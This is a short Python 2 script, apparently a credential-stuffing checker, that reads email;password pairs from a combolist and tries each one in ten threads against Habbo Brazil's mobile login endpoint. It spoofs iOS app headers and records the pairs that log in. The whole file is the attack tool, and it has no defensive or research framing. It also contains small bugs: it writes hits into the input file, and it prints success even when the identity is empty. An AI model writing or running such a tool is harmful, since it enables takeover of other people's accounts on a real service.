import json, requests, sys, threading, Queue

threads = 10
combolist = sys.argv[1]
outputlist = sys.argv[1]

def testLogin(queue):
    while queue:
        try:
            q = queue.get(False)
            email = q[0]
            password = q[1]

            url = "https://www.habbo.com.br/pocket/1/auth/connect"

            payload = {"email" : email,
                       "password" : password}

            headers = {"User-Agent" : "PocketHabbo/22",
                       "Content-Type" : "application/json",
                       "Accept-Encoding" : "gzip",
                       "X-Habbo-Device-ID" : "f1a39aca7d80d4daeade8f5db6d7b208164003dc8a7bf15bd93d684ae7ee0033399c75c41ede7e3c",
                       "X-Habbo-Device-Type" : "ios",
                       "X-Habbo-App-ID" : "WQZQIZMAU7j6hsc6",
                       "X-Habbo-Version" : "22",
                       "X-Habbo-Checksum" : "0bf6b34b41f8b914ad9fa0782789fd9229215d18"}

            r = requests.post(url, data=payload, headers=headers)
            resp_nbd = json.loads(r.text)
    
            try:
                if resp_nbd["identity"] != None:
                    open(outputlist, "a").write("%s:%s\n" % (email, password))
                sys.stdout.write("[SUCCESS] %s:%s\n" % (email, password))
            except KeyError:
                sys.stdout.write("[FAILURE] %s:%s\n" % (email, password))
        except Queue.Empty:
            break

lst = open(combolist, "r").readlines()

q = Queue.Queue()

for line in lst:
    if ";" in line:
        line = line.strip().split(";")
        q.put([line[0], line[1]])

for i in xrange(threads):
    t = threading.Thread(target=testLogin, args = (q, ))
    t.start()